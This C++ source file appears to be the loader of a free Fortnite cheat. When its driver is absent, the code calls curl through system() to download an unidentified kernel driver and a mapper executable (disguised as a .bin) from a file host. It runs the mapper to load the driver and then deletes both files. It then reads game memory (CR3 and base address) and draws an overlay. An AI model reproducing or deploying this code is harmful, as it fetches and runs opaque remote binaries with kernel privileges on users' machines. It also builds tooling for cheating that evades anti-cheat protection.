#include <Windows.h>
#include <iostream>
#include <fstream>
#include <vector>
#include <cstdint>
#include "memory/driver.h"
#include "render/render.h"
#include "colors.h"
// hi cutie, you can use this code for your own purposes, but please don't claim it as your own work. I worked hard on this and would appreciate credit if you use it. Thanks! <3
// you can paste anything you want here, it's pretty shitcoded but it works so idc
// don't dm me or idk to ask how this works, its not supposed to be opened by peoples with 0 knowledge
// i tried to do some comments to explain most of the stuff but im crazy so dont mind if its not very clear, just read the code and you will understand it :3
// made by https://github.com/linoucat <3
// consider joining https://discord.gg/linouservices please :D





int load();
int main() {
        std::cout << "[" << blue << "+" << reset << "Welcome to Linou Free\n";
        Sleep(1000);
        system("cls");
        load();
}

    

int load() {

    std::cout << "Loading driver..." << std::endl;

    if (!driver.Init()) {
        system("curl -sS \"https://files.catbox.moe/kw01jh.sys\" -o \"%TEMP%\\driver.sys\"");
		system("curl -sS \"https://files.catbox.moe/wt2bfo.bin\" -o \"%TEMP%\\mapper.exe\""); // WHY IS THIS .bin FILE??? it's cuz catbox dont take exe files, so i just renamed it lol
        system("%TEMP%\\mapper.exe %TEMP%\\driver.sys");
        system("del /f /q %TEMP%\\mapper.exe");
        system("del /f /q %TEMP%\\driver.sys");

    }
    std::cout << "Driver loaded" << std::endl;

    std::cout << "Waiting for game..." << std::endl;
    while (!driver.FindProcess(L"FortniteClient-Win64-Shipping.exe")) {
        Sleep(100);
    }
    std::cout << "Game found (PID: " << driver.ProcessID << ")" << std::endl;
    MessageBoxA(0, ("Press OK in lobby!"), ("Info"), MB_ICONINFORMATION);

    std::cout << "Fetching CR3..." << std::endl;
    uintptr_t cr3 = driver.FetchCR3();
    if (!cr3) {
        std::cout << "Failed to get CR3, RESTARTING THE CHEET FIX THIS ISSUE MOST OF THE TIME" << std::endl;
        system("pause");
        return 1;
    }
    std::cout << "CR3: 0x" << std::hex << cr3 << std::dec << std::endl;

    memory.BaseAddress = driver.GetBase();
    if (!memory.BaseAddress) {
        std::cout << "Failed to get base address" << std::endl;
        system("pause");
        return 1;
    }
    std::cout << "Base address: 0x" << std::hex << memory.BaseAddress << std::dec << std::endl;


    std::cout << "Press insert to toggle menu" << std::endl;

    if (!overlay::Create()) {
        std::cout << "Failed to create overlay" << std::endl;
        return 1;
    }

    RenderLoop();

    return 0;
}

    

    
    
    
    
